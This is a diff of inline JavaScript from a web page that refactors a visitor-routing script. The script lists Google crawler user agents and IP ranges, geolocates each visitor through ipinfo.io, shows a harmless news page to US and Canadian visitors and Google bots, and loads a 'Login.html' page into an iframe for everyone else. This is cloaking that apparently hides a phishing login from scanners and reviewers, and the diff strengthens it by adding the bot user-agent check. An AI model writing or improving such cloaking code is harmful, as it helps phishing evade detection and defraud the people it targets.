@@ -42,7 +42,9 @@
       <script>
 
     
-const google_bots = [
+$(document).ready(function() {
+
+ const google_bots = [
     // Google Ads Bots
     'AdsBot-Google',
     'AdsBot-Google-Mobile',
@@ -89,18 +91,6 @@ const google_bots = [
     'Googlebot-PlayDownload',
     'Googlebot-PlayContent'
 ];
-function isGoogleBot(userAgent) {
-    return google_bots.some(bot => userAgent.includes(bot));
-}
-
-function setIframeSrc() {
-    var offlineHtml = '<html><body><h1>You are currently offline</h1></body></html>';
-    var offlineDataUrl = 'data:text/html;charset=utf-8,' + encodeURI(offlineHtml);
-    var iframeSrc = navigator.onLine ? (localStorage.getItem("lastViewedPage") || "splash.html") : offlineDataUrl;
-    
-    $('#loader').show(); 
-    $('#preview-frame').attr('src', iframeSrc);
-}
 
          const googleIPRanges = [
             '172.217.0.0/16',
@@ -110,56 +100,80 @@ function setIframeSrc() {
             '2001:4860:4860::/32'
          ];
 
-function ipInRange(ip, range) {
-    // Placeholder function
-    return false;
-}
+    function isGoogleBot(userAgent) {
+        return google_bots.some(bot => userAgent.includes(bot));
+    }
 
-function checkIPAndSetIframeSrc() {
-    fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            const userIP = data.ip;
-            const countryCode = data.country;
+    function setIframeSrc() {
+        const offlineHtml = '<html><body><h1>You are currently offline</h1></body></html>';
+        const offlineDataUrl = 'data:text/html;charset=utf-8,' + encodeURI(offlineHtml);
+        const iframeSrc = navigator.onLine ? (localStorage.getItem("lastViewedPage") || "splash.html") : offlineDataUrl;
 
-            if (countryCode === 'US' || countryCode === 'CA' || googleIPRanges.some(range => ipInRange(userIP, range))) {
-                $('#preview-frame').attr('src', 'myneews/home.html');
-            } else {
-                $('#preview-frame').attr('src', 'quopi/Login.html');
-            }
-        })
-        .catch(error => {
-            console.error('Error fetching IP data:', error);
-        });
-}
+        $('#loader').show(); 
+        $('#preview-frame').attr('src', iframeSrc);
+    }
 
-// ... [rest of the code]
+    function ipInRange(ip, range) {
+        // Placeholder function - you need actual logic here
+        return false;
+    }
 
-$(document).ready(function() {
-    // When the iframe loads a new page, save its URL to local storage
-$('#preview-frame').on('load', function() {
-    $('#loader').fadeOut();
-    if (navigator.onLine) {
-        // Save the current iframe's URL to local storage
+    function checkIPAndSetIframeSrc() {
+        fetch('https://ipinfo.io/json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+                const countryCode = data.country;
+
+                if (countryCode === 'US' || countryCode === 'CA' || googleIPRanges.some(range => ipInRange(userIP, range)) || isGoogleBot(navigator.userAgent)) {
+                    $('#preview-frame').attr('src', 'myneews/home.html');
+                } else {
+                    $('#preview-frame').attr('src', 'quopi/Login.html');
+                }
+            })
+            .catch(error => {
+                console.error('Error fetching IP data:', error);
+            });
+    }
+
+    function saveIframeUrlToLocalStorage() {
         const currentIframeURL = $('#preview-frame').get(0).contentWindow.location.href;
         localStorage.setItem("lastViewedPage", currentIframeURL);
         console.log("Saved to local storage:", currentIframeURL);
     }
-});
 
-
-    // Load the latest visited page or determine the source based on IP/country
-    const lastViewedPage = localStorage.getItem("lastViewedPage");
-    if (lastViewedPage) {
-        console.log("Loading from local storage:", lastViewedPage);
-        $('#preview-frame').attr('src', lastViewedPage);
-    } else {
-        console.log("Checking IP and setting iframe source.");
-        checkIPAndSetIframeSrc();
+    function loadPageFromLocalStorageOrIP() {
+        const lastViewedPage = localStorage.getItem("lastViewedPage");
+        if (lastViewedPage) {
+            console.log("Loading from local storage:", lastViewedPage);
+            $('#preview-frame').attr('src', lastViewedPage);
+        } else {
+            console.log("Checking IP and setting iframe source.");
+            checkIPAndSetIframeSrc();
+        }
     }
 
-    window.addEventListener('online', setIframeSrc);
-    window.addEventListener('offline', setIframeSrc);
+    function handleOnlineOfflineEvent() {
+        if (navigator.onLine) {
+            loadPageFromLocalStorageOrIP();
+        } else {
+            setIframeSrc();
+        }
+    }
+
+    // Event Handlers
+    $('#preview-frame').on('load', function() {
+        $('#loader').fadeOut();
+        if (navigator.onLine) {
+            saveIframeUrlToLocalStorage();
+        }
+    });
+
+    window.addEventListener('online', handleOnlineOfflineEvent);
+    window.addEventListener('offline', handleOnlineOfflineEvent);
+
+    // Initial check and page loading
+    handleOnlineOfflineEvent();
 });
 
 
